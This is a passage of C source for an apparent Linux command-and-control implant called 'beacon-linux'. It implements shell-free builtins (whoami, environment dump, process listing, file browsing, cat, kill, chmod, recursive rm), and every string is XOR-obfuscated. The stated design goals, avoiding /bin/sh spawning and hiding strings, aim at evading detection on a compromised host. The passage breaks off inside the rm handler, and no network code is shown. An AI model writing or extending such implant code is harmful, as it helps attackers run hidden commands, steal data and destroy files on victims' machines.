/*
 * builtin.c — native builtins for beacon-linux (no /bin/sh spawning)
 *
 * All strings XOR-obfuscated via xor_dec() from util/obf.h + obf_strings.h.
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <errno.h>
#include <pwd.h>
#include <grp.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <ifaddrs.h>
#include <fcntl.h>
#include <signal.h>
#include <ftw.h>
#include <time.h>

#include "builtin.h"
#include "beacon.h"
#include "util/obf.h"
#include "obf_strings.h"

/* -------------------------------------------------------------------------
 * Internal helpers
 * ---------------------------------------------------------------------- */

/* Append printf-formatted text into buf at position pos; return new pos. */
static int out_append(char *buf, int buf_size, int pos, const char *fmt, ...) {
    if (pos < 0 || pos >= buf_size - 1) return (buf_size > 0 ? buf_size - 1 : 0);
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf + pos, (size_t)(buf_size - pos), fmt, ap);
    va_end(ap);
    if (n < 0) return pos;
    int new_pos = pos + n;
    if (new_pos >= buf_size) new_pos = buf_size - 1;
    buf[new_pos] = '\0';
    return new_pos;
}

/* Skip leading whitespace from a string. */
static const char *ltrim(const char *s) {
    while (*s == ' ' || *s == '\t') s++;
    return s;
}

/* Permission string helper — fills exactly 9 chars + NUL into perm[10]. */
static void mode_to_str(mode_t m, char perm[10]) {
    perm[0] = (m & S_IRUSR) ? 'r' : '-';
    perm[1] = (m & S_IWUSR) ? 'w' : '-';
    perm[2] = (m & S_IXUSR) ? 'x' : '-';
    perm[3] = (m & S_IRGRP) ? 'r' : '-';
    perm[4] = (m & S_IWGRP) ? 'w' : '-';
    perm[5] = (m & S_IXGRP) ? 'x' : '-';
    perm[6] = (m & S_IROTH) ? 'r' : '-';
    perm[7] = (m & S_IWOTH) ? 'w' : '-';
    perm[8] = (m & S_IXOTH) ? 'x' : '-';
    perm[9] = '\0';
}

/* Read a single small text file into dst (at most max-1 bytes), NUL-terminate. */
static int read_small_file(const char *path, char *dst, int max) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, dst, (size_t)(max - 1));
    close(fd);
    if (n < 0) return -1;
    dst[n] = '\0';
    /* strip trailing newline */
    if (n > 0 && dst[n - 1] == '\n') dst[n - 1] = '\0';
    return (int)n;
}

/* XOR-decode + strcmp helper */
static int xor_eq(const char *str, const unsigned char *enc, int enc_len) {
    char tmp[256];
    if (enc_len >= (int)sizeof(tmp)) return 0;
    xor_dec(tmp, enc, (size_t)enc_len);
    return strcmp(str, tmp) == 0;
}

/* XOR-decode + strncmp helper for prefix matching */
static int xor_prefix(const char *str, const unsigned char *enc, int enc_len) {
    char tmp[256];
    if (enc_len >= (int)sizeof(tmp)) return 0;
    xor_dec(tmp, enc, (size_t)enc_len);
    return strncmp(str, tmp, (size_t)enc_len) == 0;
}

/* -------------------------------------------------------------------------
 * 1. builtin_whoami  (also handles "id")
 * ---------------------------------------------------------------------- */
static int builtin_whoami(char *buf, int buf_size) {
    int pos = 0;
    uid_t  uid  = getuid();
    uid_t  euid = geteuid();
    gid_t  gid  = getgid();
    gid_t  egid = getegid();

    struct passwd *pw = getpwuid(uid);
    const char *uname = pw ? pw->pw_name : "?";

    struct group *gr = getgrgid(gid);
    const char *gname = gr ? gr->gr_name : "?";

    pos = out_append(buf, buf_size, pos, "uid=%d(%s) gid=%d(%s)",
                     (int)uid, uname, (int)gid, gname);

    if (euid != uid) {
        struct passwd *epw = getpwuid(euid);
        pos = out_append(buf, buf_size, pos, " euid=%d(%s)",
                         (int)euid, epw ? epw->pw_name : "?");
    }
    if (egid != gid) {
        struct group *egr = getgrgid(egid);
        pos = out_append(buf, buf_size, pos, " egid=%d(%s)",
                         (int)egid, egr ? egr->gr_name : "?");
    }

    /* supplementary groups */
    int ngroups = getgroups(0, NULL);
    if (ngroups > 0) {
        gid_t *groups = malloc((size_t)ngroups * sizeof(gid_t));
        if (groups) {
            ngroups = getgroups(ngroups, groups);
            pos = out_append(buf, buf_size, pos, " groups=");
            for (int i = 0; i < ngroups; i++) {
                struct group *sg = getgrgid(groups[i]);
                if (i > 0) pos = out_append(buf, buf_size, pos, ",");
                pos = out_append(buf, buf_size, pos, "%d(%s)",
                                 (int)groups[i], sg ? sg->gr_name : "?");
            }
            free(groups);
        }
    }

    pos = out_append(buf, buf_size, pos, "\n");
    return pos;
}

/* -------------------------------------------------------------------------
 * 2. builtin_hostname
 * ---------------------------------------------------------------------- */
static int builtin_hostname(char *buf, int buf_size) {
    int pos = 0;
    char hname[256] = {0};
    gethostname(hname, sizeof(hname) - 1);

    struct utsname uts;
    uname(&uts);

    char fmt1[ENC_LX_HOSTNAME_LABEL_LEN + 1];
    xor_dec(fmt1, ENC_LX_HOSTNAME_LABEL, ENC_LX_HOSTNAME_LABEL_LEN);
    pos = out_append(buf, buf_size, pos, fmt1, hname);

    char fmt2[ENC_LX_KERNEL_LABEL_LEN + 1];
    xor_dec(fmt2, ENC_LX_KERNEL_LABEL, ENC_LX_KERNEL_LABEL_LEN);
    pos = out_append(buf, buf_size, pos, fmt2,
                     uts.sysname, uts.release, uts.machine);
    return pos;
}

/* -------------------------------------------------------------------------
 * 3. builtin_pwd
 * ---------------------------------------------------------------------- */
static int builtin_pwd(char *buf, int buf_size) {
    char cwd[4096];
    if (getcwd(cwd, sizeof(cwd)) == NULL) {
        char fmt[ENC_LX_GETCWD_ERR_LEN + 1];
        xor_dec(fmt, ENC_LX_GETCWD_ERR, ENC_LX_GETCWD_ERR_LEN);
        return out_append(buf, buf_size, 0, fmt, strerror(errno));
    }
    return out_append(buf, buf_size, 0, "%s\n", cwd);
}

/* -------------------------------------------------------------------------
 * 4. builtin_cd
 * ---------------------------------------------------------------------- */
static int builtin_cd(const char *args, char *buf, int buf_size) {
    const char *target = ltrim(args);
    if (*target == '\0') {
        char home_var[ENC_LX_ENV_HOME_LEN + 1];
        xor_dec(home_var, ENC_LX_ENV_HOME, ENC_LX_ENV_HOME_LEN);
        target = getenv(home_var);
        if (!target || *target == '\0') target = "/";
    }
    if (chdir(target) != 0) {
        char fmt[ENC_LX_CD_ERR_LEN + 1];
        xor_dec(fmt, ENC_LX_CD_ERR, ENC_LX_CD_ERR_LEN);
        return out_append(buf, buf_size, 0, fmt, target, strerror(errno));
    }
    char cwd[4096];
    if (getcwd(cwd, sizeof(cwd)) == NULL)
        return out_append(buf, buf_size, 0, "%s\n", target);
    return out_append(buf, buf_size, 0, "%s\n", cwd);
}

/* -------------------------------------------------------------------------
 * 5. builtin_env
 * ---------------------------------------------------------------------- */
extern char **environ;

static int builtin_env(char *buf, int buf_size) {
    int pos = 0;
    for (char **e = environ; *e != NULL; e++)
        pos = out_append(buf, buf_size, pos, "%s\n", *e);
    return pos;
}

/* -------------------------------------------------------------------------
 * 6. builtin_getenv
 * ---------------------------------------------------------------------- */
static int builtin_getenv(const char *args, char *buf, int buf_size) {
    const char *var = ltrim(args);
    if (*var == '\0') {
        char fmt[ENC_LX_USAGE_GETENV_LEN + 1];
        xor_dec(fmt, ENC_LX_USAGE_GETENV, ENC_LX_USAGE_GETENV_LEN);
        return out_append(buf, buf_size, 0, "%s", fmt);
    }
    const char *val = getenv(var);
    if (!val) {
        char fmt[ENC_LX_NOT_SET_LEN + 1];
        xor_dec(fmt, ENC_LX_NOT_SET, ENC_LX_NOT_SET_LEN);
        return out_append(buf, buf_size, 0, fmt, var);
    }
    return out_append(buf, buf_size, 0, "%s\n", val);
}

/* -------------------------------------------------------------------------
 * 7. builtin_mkdir
 * ---------------------------------------------------------------------- */
static int builtin_mkdir(const char *args, char *buf, int buf_size) {
    const char *path = ltrim(args);
    if (*path == '\0') {
        char fmt[ENC_LX_USAGE_MKDIR_LEN + 1];
        xor_dec(fmt, ENC_LX_USAGE_MKDIR, ENC_LX_USAGE_MKDIR_LEN);
        return out_append(buf, buf_size, 0, "%s", fmt);
    }
    if (mkdir(path, 0755) != 0) {
        char fmt[ENC_LX_MKDIR_ERR_LEN + 1];
        xor_dec(fmt, ENC_LX_MKDIR_ERR, ENC_LX_MKDIR_ERR_LEN);
        return out_append(buf, buf_size, 0, fmt, path, strerror(errno));
    }
    char fmt[ENC_LX_CREATED_LEN + 1];
    xor_dec(fmt, ENC_LX_CREATED, ENC_LX_CREATED_LEN);
    return out_append(buf, buf_size, 0, fmt, path);
}

/* -------------------------------------------------------------------------
 * 8. builtin_chmod
 * ---------------------------------------------------------------------- */
static int builtin_chmod(const char *args, char *buf, int buf_size) {
    const char *p = ltrim(args);
    if (*p == '\0') {
        char fmt[ENC_LX_USAGE_CHMOD_LEN + 1];
        xor_dec(fmt, ENC_LX_USAGE_CHMOD, ENC_LX_USAGE_CHMOD_LEN);
        return out_append(buf, buf_size, 0, "%s", fmt);
    }

    char mode_str[16] = {0};
    int i = 0;
    while (*p && *p != ' ' && i < 15) mode_str[i++] = *p++;
    mode_str[i] = '\0';

    p = ltrim(p);
    if (*p == '\0') {
        char fmt[ENC_LX_USAGE_CHMOD_LEN + 1];
        xor_dec(fmt, ENC_LX_USAGE_CHMOD, ENC_LX_USAGE_CHMOD_LEN);
        return out_append(buf, buf_size, 0, "%s", fmt);
    }

    char *end = NULL;
    long mode_val = strtol(mode_str, &end, 8);
    if (!end || *end != '\0' || mode_val < 0 || mode_val > 07777) {
        char fmt[ENC_LX_CHMOD_INVAL_LEN + 1];
        xor_dec(fmt, ENC_LX_CHMOD_INVAL, ENC_LX_CHMOD_INVAL_LEN);
        return out_append(buf, buf_size, 0, fmt, mode_str);
    }

    if (chmod(p, (mode_t)mode_val) != 0) {
        char fmt[ENC_LX_CHMOD_ERR_LEN + 1];
        xor_dec(fmt, ENC_LX_CHMOD_ERR, ENC_LX_CHMOD_ERR_LEN);
        return out_append(buf, buf_size, 0, fmt, p, strerror(errno));
    }
    char fmt[ENC_LX_CHMOD_OK_LEN + 1];
    xor_dec(fmt, ENC_LX_CHMOD_OK, ENC_LX_CHMOD_OK_LEN);
    return out_append(buf, buf_size, 0, fmt, p, mode_val);
}

/* -------------------------------------------------------------------------
 * 9. builtin_kill_cmd
 * ---------------------------------------------------------------------- */
static int builtin_kill_cmd(const char *args, char *buf, int buf_size) {
    const char *p = ltrim(args);
    int sig = SIGTERM;

    if (*p == '-') {
        p++;
        char sig_str[16] = {0};
        int i = 0;
        while (*p && *p != ' ' && i < 15) sig_str[i++] = *p++;
        sig_str[i] = '\0';
        char *end = NULL;
        long sv = strtol(sig_str, &end, 10);
        if (!end || *end != '\0') {
            char fmt[ENC_LX_KILL_INVAL_SIG_LEN + 1];
            xor_dec(fmt, ENC_LX_KILL_INVAL_SIG, ENC_LX_KILL_INVAL_SIG_LEN);
            return out_append(buf, buf_size, 0, fmt, sig_str);
        }
        sig = (int)sv;
        p = ltrim(p);
    }

    if (*p == '\0') {
        char fmt[ENC_LX_USAGE_KILL_LEN + 1];
        xor_dec(fmt, ENC_LX_USAGE_KILL, ENC_LX_USAGE_KILL_LEN);
        return out_append(buf, buf_size, 0, "%s", fmt);
    }

    char *end = NULL;
    long pid_val = strtol(p, &end, 10);
    if (!end || (*end != '\0' && *end != '\n')) {
        char fmt[ENC_LX_KILL_INVAL_PID_LEN + 1];
        xor_dec(fmt, ENC_LX_KILL_INVAL_PID, ENC_LX_KILL_INVAL_PID_LEN);
        return out_append(buf, buf_size, 0, fmt, p);
    }

    if (kill((pid_t)pid_val, sig) != 0) {
        if (errno == EPERM) {
            char fmt[ENC_LX_KILL_PERM_LEN + 1];
            xor_dec(fmt, ENC_LX_KILL_PERM, ENC_LX_KILL_PERM_LEN);
            return out_append(buf, buf_size, 0, fmt, (int)pid_val);
        }
        if (errno == ESRCH) {
            char fmt[ENC_LX_KILL_NOSUCH_LEN + 1];
            xor_dec(fmt, ENC_LX_KILL_NOSUCH, ENC_LX_KILL_NOSUCH_LEN);
            return out_append(buf, buf_size, 0, fmt, (int)pid_val);
        }
        char fmt[ENC_LX_KILL_ERR_LEN + 1];
        xor_dec(fmt, ENC_LX_KILL_ERR, ENC_LX_KILL_ERR_LEN);
        return out_append(buf, buf_size, 0, fmt, (int)pid_val, strerror(errno));
    }
    char fmt[ENC_LX_KILLED_LEN + 1];
    xor_dec(fmt, ENC_LX_KILLED, ENC_LX_KILLED_LEN);
    return out_append(buf, buf_size, 0, fmt, (int)pid_val, sig);
}

/* -------------------------------------------------------------------------
 * 10. builtin_ps
 * ---------------------------------------------------------------------- */

typedef struct {
    int  pid;
    int  ppid;
    char state;
    char comm[256];
    char cmdline[64];
    char user[32];
} ProcEntry;

/* Compare for qsort by PID */
static int proc_cmp(const void *a, const void *b) {
    return ((ProcEntry *)a)->pid - ((ProcEntry *)b)->pid;
}

static int builtin_ps(char *buf, int buf_size) {
    int pos = 0;
    int count = 0;
    int cap = 256;
    ProcEntry *procs = malloc((size_t)cap * sizeof(ProcEntry));
    if (!procs) {
        char fmt[ENC_LX_PS_MALLOC_LEN + 1];
        xor_dec(fmt, ENC_LX_PS_MALLOC, ENC_LX_PS_MALLOC_LEN);
        return out_append(buf, buf_size, 0, "%s", fmt);
    }

    char proc_path[ENC_LX_PROC_LEN + 1];
    xor_dec(proc_path, ENC_LX_PROC, ENC_LX_PROC_LEN);

    DIR *proc_dir = opendir(proc_path);
    if (!proc_dir) {
        free(procs);
        char fmt[ENC_LX_PS_OPENPROC_LEN + 1];
        xor_dec(fmt, ENC_LX_PS_OPENPROC, ENC_LX_PS_OPENPROC_LEN);
        return out_append(buf, buf_size, 0, fmt, strerror(errno));
    }

    char stat_fmt[ENC_LX_PROC_PID_STAT_LEN + 1];
    xor_dec(stat_fmt, ENC_LX_PROC_PID_STAT, ENC_LX_PROC_PID_STAT_LEN);
    char status_fmt[ENC_LX_PROC_PID_STATUS_LEN + 1];
    xor_dec(status_fmt, ENC_LX_PROC_PID_STATUS, ENC_LX_PROC_PID_STATUS_LEN);
    char cmdline_fmt[ENC_LX_PROC_PID_CMDLINE_LEN + 1];
    xor_dec(cmdline_fmt, ENC_LX_PROC_PID_CMDLINE, ENC_LX_PROC_PID_CMDLINE_LEN);
    char uid_nl[ENC_LX_UID_NL_LEN + 1];
    xor_dec(uid_nl, ENC_LX_UID_NL, ENC_LX_UID_NL_LEN);
    char uid_bare[ENC_LX_UID_BARE_LEN + 1];
    xor_dec(uid_bare, ENC_LX_UID_BARE, ENC_LX_UID_BARE_LEN);

    struct dirent *de;
    while ((de = readdir(proc_dir)) != NULL) {
        /* only numeric entries are PID directories */
        if (de->d_name[0] < '1' || de->d_name[0] > '9') continue;
        char *end_p = NULL;
        long pid_num = strtol(de->d_name, &end_p, 10);
        if (!end_p || *end_p != '\0') continue;

        ProcEntry e;
        memset(&e, 0, sizeof(e));
        e.pid = (int)pid_num;

        char path[128];
        snprintf(path, sizeof(path), stat_fmt, e.pid);
        char stat_buf[512];
        if (read_small_file(path, stat_buf, sizeof(stat_buf)) > 0) {
            char *lp = strchr(stat_buf, '(');
            char *rp = strrchr(stat_buf, ')');
            if (lp && rp && rp > lp) {
                int clen = (int)(rp - lp - 1);
                if (clen >= (int)sizeof(e.comm)) clen = (int)sizeof(e.comm) - 1;
                memcpy(e.comm, lp + 1, (size_t)clen);
                e.comm[clen] = '\0';
                if (*(rp + 1) == ' ') {
                    sscanf(rp + 2, "%c %d", &e.state, &e.ppid);
                }
            }
        }

        snprintf(path, sizeof(path), status_fmt, e.pid);
        {
            int fd = open(path, O_RDONLY);
            if (fd >= 0) {
                char sbuf[2048];
                ssize_t n = read(fd, sbuf, sizeof(sbuf) - 1);
                close(fd);
                if (n > 0) {
                    sbuf[n] = '\0';
                    char *uid_line = strstr(sbuf, uid_nl);
                    if (!uid_line) uid_line = strstr(sbuf, uid_bare);
                    if (uid_line) {
                        uid_line = strchr(uid_line, ':');
                        if (uid_line) {
                            uid_line++;
                            while (*uid_line == ' ' || *uid_line == '\t') uid_line++;
                            long ruid = strtol(uid_line, NULL, 10);
                            struct passwd *pw = getpwuid((uid_t)ruid);
                            if (pw) {
                                strncpy(e.user, pw->pw_name, sizeof(e.user) - 1);
                            } else {
                                snprintf(e.user, sizeof(e.user), "%ld", ruid);
                            }
                        }
                    }
                }
            }
        }
        if (e.user[0] == '\0') strncpy(e.user, "?", sizeof(e.user) - 1);

        snprintf(path, sizeof(path), cmdline_fmt, e.pid);
        {
            int fd = open(path, O_RDONLY);
            if (fd >= 0) {
                char cbuf[64];
                ssize_t n = read(fd, cbuf, sizeof(cbuf) - 1);
                close(fd);
                if (n > 0) {
                    cbuf[n] = '\0';
                    for (ssize_t k = 0; k < n - 1; k++)
                        if (cbuf[k] == '\0') cbuf[k] = ' ';
                    strncpy(e.cmdline, cbuf, sizeof(e.cmdline) - 1);
                    e.cmdline[sizeof(e.cmdline) - 1] = '\0';
                }
            }
        }
        if (e.cmdline[0] == '\0') {
            snprintf(e.cmdline, sizeof(e.cmdline), "[%s]", e.comm);
        }
        if (e.state == '\0') e.state = '?';

        if (count >= cap) {
            cap *= 2;
            ProcEntry *np = realloc(procs, (size_t)cap * sizeof(ProcEntry));
            if (!np) break;
            procs = np;
        }
        procs[count++] = e;
    }
    closedir(proc_dir);

    qsort(procs, (size_t)count, sizeof(ProcEntry), proc_cmp);

    char h_pid[ENC_LX_PS_HDR_PID_LEN + 1];
    xor_dec(h_pid, ENC_LX_PS_HDR_PID, ENC_LX_PS_HDR_PID_LEN);
    char h_ppid[ENC_LX_PS_HDR_PPID_LEN + 1];
    xor_dec(h_ppid, ENC_LX_PS_HDR_PPID, ENC_LX_PS_HDR_PPID_LEN);
    char h_user[ENC_LX_PS_HDR_USER_LEN + 1];
    xor_dec(h_user, ENC_LX_PS_HDR_USER, ENC_LX_PS_HDR_USER_LEN);
    char h_state[ENC_LX_PS_HDR_STATE_LEN + 1];
    xor_dec(h_state, ENC_LX_PS_HDR_STATE, ENC_LX_PS_HDR_STATE_LEN);
    char h_cmd[ENC_LX_PS_HDR_CMD_LEN + 1];
    xor_dec(h_cmd, ENC_LX_PS_HDR_CMD, ENC_LX_PS_HDR_CMD_LEN);

    pos = out_append(buf, buf_size, pos,
        "%6s  %6s  %-14s %-6s %s\n", h_pid, h_ppid, h_user, h_state, h_cmd);
    for (int i = 0; i < count; i++) {
        char st[2] = { procs[i].state, '\0' };
        pos = out_append(buf, buf_size, pos,
            "%6d  %6d  %-14s %-6s %s\n",
            procs[i].pid, procs[i].ppid, procs[i].user, st, procs[i].cmdline);
    }
    free(procs);
    return pos;
}

/* -------------------------------------------------------------------------
 * 11. builtin_ls
 * ---------------------------------------------------------------------- */
static int builtin_ls(const char *args, char *buf, int buf_size) {
    int pos = 0;
    char path[4096];

    const char *target = ltrim(args);
    if (*target == '\0') {
        if (getcwd(path, sizeof(path)) == NULL) {
            char fmt[ENC_LX_LS_GETCWD_LEN + 1];
            xor_dec(fmt, ENC_LX_LS_GETCWD, ENC_LX_LS_GETCWD_LEN);
            return out_append(buf, buf_size, 0, fmt, strerror(errno));
        }
    } else {
        strncpy(path, target, sizeof(path) - 1);
        path[sizeof(path) - 1] = '\0';
    }

    DIR *d = opendir(path);
    if (!d) {
        char fmt[ENC_LX_LS_ERR_LEN + 1];
        xor_dec(fmt, ENC_LX_LS_ERR, ENC_LX_LS_ERR_LEN);
        return out_append(buf, buf_size, 0, fmt, path, strerror(errno));
    }

    struct dirent *de;
    while ((de = readdir(d)) != NULL) {
        if (de->d_name[0] == '.' && (de->d_name[1] == '\0' ||
            (de->d_name[1] == '.' && de->d_name[2] == '\0'))) continue;

        char full[4096 + 256 + 2];
        snprintf(full, sizeof(full), "%s/%s", path, de->d_name);

        struct stat st;
        if (lstat(full, &st) != 0) continue;

        /* file-type char */
        char type_c;
        switch (st.st_mode & S_IFMT) {
            case S_IFDIR:  type_c = 'd'; break;
            case S_IFLNK:  type_c = 'l'; break;
            case S_IFCHR:  type_c = 'c'; break;
            case S_IFBLK:  type_c = 'b'; break;
            case S_IFIFO:  type_c = 'p'; break;
            case S_IFSOCK: type_c = 's'; break;
            default:       type_c = '-'; break;
        }

        char perm[10];
        mode_to_str(st.st_mode, perm);

        const char *owner = "?";
        const char *group = "?";
        struct passwd *pw = getpwuid(st.st_uid);
        if (pw) owner = pw->pw_name;
        struct group  *gr = getgrgid(st.st_gid);
        if (gr) group = gr->gr_name;

        char mtime_str[20];
        struct tm tm_info;
        localtime_r(&st.st_mtime, &tm_info);
        strftime(mtime_str, sizeof(mtime_str), "%Y-%m-%d %H:%M", &tm_info);

        if (S_ISLNK(st.st_mode)) {
            char lnk[512] = {0};
            ssize_t lr = readlink(full, lnk, sizeof(lnk) - 1);
            if (lr < 0) strncpy(lnk, "?", sizeof(lnk) - 1);
            else lnk[lr] = '\0';
            pos = out_append(buf, buf_size, pos,
                "%c%s  %-10s %-10s %8lld  %s  %s -> %s\n",
                type_c, perm, owner, group,
                (long long)st.st_size, mtime_str, de->d_name, lnk);
        } else {
            pos = out_append(buf, buf_size, pos,
                "%c%s  %-10s %-10s %8lld  %s  %s\n",
                type_c, perm, owner, group,
                (long long)st.st_size, mtime_str, de->d_name);
        }
    }
    closedir(d);
    return pos;
}

/* -------------------------------------------------------------------------
 * 11b. builtin_filebrowser — JSON directory listing for file browser UI
 * ---------------------------------------------------------------------- */

/* Append a JSON-escaped version of src into buf at pos. */
static int json_escape_append(char *buf, int buf_size, int pos, const char *src) {
    for (; *src && pos < buf_size - 2; src++) {
        switch (*src) {
            case '"':  pos = out_append(buf, buf_size, pos, "\\\""); break;
            case '\\': pos = out_append(buf, buf_size, pos, "\\\\"); break;
            case '\n': pos = out_append(buf, buf_size, pos, "\\n");  break;
            case '\r': pos = out_append(buf, buf_size, pos, "\\r");  break;
            case '\t': pos = out_append(buf, buf_size, pos, "\\t");  break;
            default:
                if ((unsigned char)*src < 0x20)
                    pos = out_append(buf, buf_size, pos, "\\u%04x", (unsigned)*src);
                else
                    pos = out_append(buf, buf_size, pos, "%c", *src);
                break;
        }
    }
    return pos;
}

static int builtin_filebrowser(const char *args, char *buf, int buf_size) {
    int pos = 0;
    char path[4096];

    const char *target = ltrim(args);
    if (*target == '\0') {
        if (getcwd(path, sizeof(path)) == NULL)
            return out_append(buf, buf_size, 0,
                "[{\"error\":\"%s\"}]", strerror(errno));
    } else {
        strncpy(path, target, sizeof(path) - 1);
        path[sizeof(path) - 1] = '\0';
    }

    DIR *d = opendir(path);
    if (!d)
        return out_append(buf, buf_size, 0,
            "[{\"error\":\"%s\"}]", strerror(errno));

    /* decode type strings once */
    char ts_dir[ENC_LX_FB_TYPE_DIR_LEN + 1];
    xor_dec(ts_dir, ENC_LX_FB_TYPE_DIR, ENC_LX_FB_TYPE_DIR_LEN);
    char ts_link[ENC_LX_FB_TYPE_LINK_LEN + 1];
    xor_dec(ts_link, ENC_LX_FB_TYPE_LINK, ENC_LX_FB_TYPE_LINK_LEN);
    char ts_char[ENC_LX_FB_TYPE_CHAR_LEN + 1];
    xor_dec(ts_char, ENC_LX_FB_TYPE_CHAR, ENC_LX_FB_TYPE_CHAR_LEN);
    char ts_block[ENC_LX_FB_TYPE_BLOCK_LEN + 1];
    xor_dec(ts_block, ENC_LX_FB_TYPE_BLOCK, ENC_LX_FB_TYPE_BLOCK_LEN);
    char ts_pipe[ENC_LX_FB_TYPE_PIPE_LEN + 1];
    xor_dec(ts_pipe, ENC_LX_FB_TYPE_PIPE, ENC_LX_FB_TYPE_PIPE_LEN);
    char ts_sock[ENC_LX_FB_TYPE_SOCKET_LEN + 1];
    xor_dec(ts_sock, ENC_LX_FB_TYPE_SOCKET, ENC_LX_FB_TYPE_SOCKET_LEN);
    char ts_file[ENC_LX_FB_TYPE_FILE_LEN + 1];
    xor_dec(ts_file, ENC_LX_FB_TYPE_FILE, ENC_LX_FB_TYPE_FILE_LEN);

    pos = out_append(buf, buf_size, pos, "[");
    int first = 1;
    struct dirent *de;

    while ((de = readdir(d)) != NULL) {
        if (de->d_name[0] == '.' && (de->d_name[1] == '\0' ||
            (de->d_name[1] == '.' && de->d_name[2] == '\0')))
            continue;

        char full[4096 + 256 + 2];
        snprintf(full, sizeof(full), "%s/%s", path, de->d_name);

        struct stat st;
        if (lstat(full, &st) != 0) continue;

        /* file-type string */
        const char *type_str;
        char type_c;
        switch (st.st_mode & S_IFMT) {
            case S_IFDIR:  type_str = ts_dir;    type_c = 'd'; break;
            case S_IFLNK:  type_str = ts_link;   type_c = 'l'; break;
            case S_IFCHR:  type_str = ts_char;   type_c = 'c'; break;
            case S_IFBLK:  type_str = ts_block;  type_c = 'b'; break;
            case S_IFIFO:  type_str = ts_pipe;   type_c = 'p'; break;
            case S_IFSOCK: type_str = ts_sock;   type_c = 's'; break;
            default:       type_str = ts_file;   type_c = '-'; break;
        }

        char perm[10];
        mode_to_str(st.st_mode, perm);

        const char *owner = "?";
        const char *group = "?";
        struct passwd *pw = getpwuid(st.st_uid);
        if (pw) owner = pw->pw_name;
        struct group  *gr = getgrgid(st.st_gid);
        if (gr) group = gr->gr_name;

        char mtime_str[24];
        struct tm tm_info;
        localtime_r(&st.st_mtime, &tm_info);
        strftime(mtime_str, sizeof(mtime_str), "%Y-%m-%dT%H:%M:%S", &tm_info);

        if (!first) pos = out_append(buf, buf_size, pos, ",");
        first = 0;

        /* open object with escaped name */
        pos = out_append(buf, buf_size, pos, "{\"name\":\"");
        pos = json_escape_append(buf, buf_size, pos, de->d_name);
        pos = out_append(buf, buf_size, pos,
            "\",\"type\":\"%s\",\"perms\":\"%c%s\","
            "\"owner\":\"%s\",\"group\":\"%s\","
            "\"size\":%lld,\"mtime\":\"%s\"",
            type_str, type_c, perm, owner, group,
            (long long)st.st_size, mtime_str);

        /* symlink target */
        if (S_ISLNK(st.st_mode)) {
            char lnk[512] = {0};
            ssize_t lr = readlink(full, lnk, sizeof(lnk) - 1);
            if (lr >= 0) lnk[lr] = '\0';
            else          strncpy(lnk, "?", sizeof(lnk) - 1);
            pos = out_append(buf, buf_size, pos, ",\"target\":\"");
            pos = json_escape_append(buf, buf_size, pos, lnk);
            pos = out_append(buf, buf_size, pos, "\"");
        }

        pos = out_append(buf, buf_size, pos, "}");
    }
    closedir(d);
    pos = out_append(buf, buf_size, pos, "]");
    return pos;
}

/* -------------------------------------------------------------------------
 * 12. builtin_cat
 * ---------------------------------------------------------------------- */
static int builtin_cat(const char *args, char *buf, int buf_size) {
    const char *path = ltrim(args);
    if (*path == '\0') {
        char fmt[ENC_LX_USAGE_CAT_LEN + 1];
        xor_dec(fmt, ENC_LX_USAGE_CAT, ENC_LX_USAGE_CAT_LEN);
        return out_append(buf, buf_size, 0, "%s", fmt);
    }

    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        char fmt[ENC_LX_CAT_ERR_LEN + 1];
        xor_dec(fmt, ENC_LX_CAT_ERR, ENC_LX_CAT_ERR_LEN);
        return out_append(buf, buf_size, 0, fmt, path, strerror(errno));
    }

    struct stat st;
    if (fstat(fd, &st) == 0 && st.st_size > 1048576) {
        close(fd);
        char fmt[ENC_LX_CAT_TOOLARGE_LEN + 1];
        xor_dec(fmt, ENC_LX_CAT_TOOLARGE, ENC_LX_CAT_TOOLARGE_LEN);
        return out_append(buf, buf_size, 0, "%s", fmt);
    }

    int pos = 0;
    char tmp[4096];
    ssize_t n;
    while ((n = read(fd, tmp, sizeof(tmp))) > 0) {
        int avail = buf_size - pos - 1;
        if (avail <= 0) break;
        int copy = (n > (ssize_t)avail) ? avail : (int)n;
        memcpy(buf + pos, tmp, (size_t)copy);
        pos += copy;
        buf[pos] = '\0';
    }
    close(fd);
    return pos;
}

/* -------------------------------------------------------------------------
 * 13. builtin_rm
 * ---------------------------------------------------------------------- */

static int g_rm_errors = 0;

static int rm_callback(const char *fpath, const struct stat *sb,
                        int typeflag, struct FTW *ftwbuf) {
    (void)sb; (void)ftwbuf;
    int r;
    if (typeflag == FTW_DP || typeflag == FTW_D)
        r = rmdir(fpath);
    else
        r = unlink(fpath);
    if (r != 0) g_rm_errors++;
    return 0;
}

static int builtin_rm(const char *args, char *buf, int buf_size) {
    const char *p = ltrim(args);
    int recursive = 0;

    char rf_sp[ENC_LX_RM_RF_SP_LEN + 1]; xor_dec(rf_sp, ENC_LX_RM_RF_SP, ENC_LX_RM_RF_SP_LEN);
    char fr_sp[ENC_LX_RM_FR_SP_LEN + 1]; xor_dec(fr_sp, ENC_LX_RM_FR_SP, ENC_LX_RM_FR_SP_LEN);
    char r_sp[ENC_LX_RM_R_SP_LEN + 1];   xor_dec(r_sp, ENC_LX_RM_R_SP, ENC_LX_RM_R_SP_LEN);
    char r_flag[ENC_LX_RM_R_LEN + 1];    xor_dec(r_flag, ENC_LX_RM_R, ENC_LX_RM_R_LEN);
    char rf_flag[ENC_LX_RM_RF_LEN + 1];  xor_dec(rf_flag, ENC_LX_RM_RF, ENC_LX_RM_RF_LEN);
    char fr_flag[ENC_LX_RM_FR_LEN + 1];  xor_dec(fr_flag, ENC_LX_RM_FR, ENC_LX_RM_FR_LEN);

    if (strncmp(p, rf_sp, 4) == 0 || strncmp(p, fr_sp, 4) == 0) {
        recursive = 1; p = ltrim(p + 4);
    } else if (strncmp(p, r_sp, 3) == 0) {
        recursive = 1; p = ltrim(p + 3);
    } else if (strcmp(p, r_flag) == 0 || strcmp(p, rf_flag) == 0 || strcmp(p, fr_flag) == 0) {
        char fmt[ENC_LX_USAGE_RM_LEN + 1];
        xor_dec(fmt, ENC_LX_USAGE_RM, ENC_LX_USAGE_RM_LEN);
